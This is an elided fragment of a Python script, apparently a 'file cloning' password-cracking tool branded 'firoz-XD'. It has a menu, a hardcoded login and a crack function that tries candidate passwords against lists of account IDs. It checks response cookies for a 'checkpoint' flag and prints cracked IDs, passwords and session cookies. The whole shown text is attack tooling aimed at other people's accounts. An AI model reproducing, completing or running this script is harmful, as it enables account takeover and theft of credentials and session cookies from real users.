...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mfiroz')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'firoz' and password == 'Love':
...
def login():
	banner()
	firozj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	firozj('\033[0;97m===============================================')
	firoz= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if firoz in ['m']:
		public()
	elif firoz in ['1']:
		crack_file()
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN BOY\n\x1b[1;97m [1] METHOD 1 ')
	os.system('espeak -a 300 "  method,  1"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[firoz-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#firoz-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•firoz-Cp] {idf} • {pw}')     
				...
				#firoz-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•firoz-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
